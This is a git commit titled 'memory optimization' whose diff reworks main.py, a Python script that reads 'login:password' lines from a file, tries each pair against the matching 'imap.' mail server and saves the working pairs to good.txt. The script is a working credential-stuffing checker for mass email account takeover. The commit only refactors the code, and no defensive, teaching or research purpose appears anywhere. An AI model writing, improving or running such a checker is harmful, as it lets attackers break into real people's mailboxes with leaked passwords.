678d21bb24538a77dc5d11dcacb9936f7c374a28
Rikstone <kolevatov01@mail.ru>
2019-03-08 03:45:00 +0500

    memory optimization

--- main.py
+++ main.py
@@ -6,53 +6,41 @@ import argparse
 import sys
 import os.path
 
-def valid_file(param): # Check file extension
-    ext = os.path.splitext(param)[1] # Get file extension
-    if ext.lower() != '.txt':
-        raise argparse.ArgumentTypeError('File must have a .txt extension')
-
-    return param
 
 def create_parser ():
     parser = argparse.ArgumentParser()
-    parser.add_argument('inputDirectory',type=valid_file,help='Path to the input directory.')
+    parser.add_argument('inputDirectory',help='Path to the input directory.')
  
     return parser
 
-def get_mail_list(path):
-    mail = []
-    with open(path,'r') as f:
-        for line in f:
-            mail.append(line.strip())
 
-    return mail
-
-def mail_auth(login,password,path):
+def mail_auth(login,password,file_path):
     print('%s:%s' % (login,password))
     try:
         server = login.split('@')[1]
         mail = imaplib.IMAP4_SSL('imap.'+server)
         mail.login(login,password)
         print('good')
-        with open(path,'a') as f: # Сreate good.txt in script directory
+        with open(file_path,'a') as f: # Сreate good.txt in script directory
             f.write('%s:%s\n' % (login,password))
     except:
         pass
 
 def main():
-    path = os.path.join(os.path.dirname(__file__),'good.txt') # Create absolute path for good.txt
+
+    file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)),'good.txt') # Create absolute path for good.txt
     parser = create_parser()
     namespace = parser.parse_args(sys.argv[1:])
-    mail = get_mail_list(namespace.inputDirectory)
-  
-    for data in mail:
-        try:
-            account = data.split(':')
-            login = account[0]
-            password = account[1]
-            mail_auth(login,password,path)
-        except IndexError:
-            continue
+
+    with open(namespace.inputDirectory,'r') as f_read: # Check log:pass line by line
+        for line in f_read:
+            try:
+                account = line.strip() # Get data and destroy \n
+                login = account.split(':')[0]
+                password = account.split(':')[1]
+                mail_auth(login,password,file_path)
+            except IndexError:
+                continue
 
 if __name__ == '__main__':
     main()
